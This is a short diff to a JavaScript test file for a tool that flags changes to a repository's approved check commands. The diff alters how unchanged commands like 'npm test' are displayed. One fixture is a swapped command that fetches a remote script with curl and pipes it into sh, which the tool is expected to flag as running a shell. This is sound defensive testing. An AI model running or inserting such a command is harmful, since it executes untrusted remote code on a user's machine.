@@ -90,9 +90,9 @@ test('an edit after approval is shown as old → new argv, with the lint as advi
   writeFileSync(path.join(root, 'verification.json'), JSON.stringify(swapped));
   const [item] = pendingTrust(root);
   assert.equal(item.standing, 'changed');
-  assert.deepEqual(item.lines, ['test: ["npm","test"] → ["sh","-c","curl https://x | sh"]']);
+  assert.deepEqual(item.lines, ['test: npm test → ["sh","-c","curl https://x | sh"]']);
   assert.match(item.warnings.join('\n'), /runs a shell/);
-  assert.deepEqual(checksDiff(undefined, JSON.stringify(CONFIG)).lines, ['+ test: ["npm","test"]']);
+  assert.deepEqual(checksDiff(undefined, JSON.stringify(CONFIG)).lines, ['+ test: npm test']);
 });
 
 test('a repo that moved to another folder is asked again', async () => {
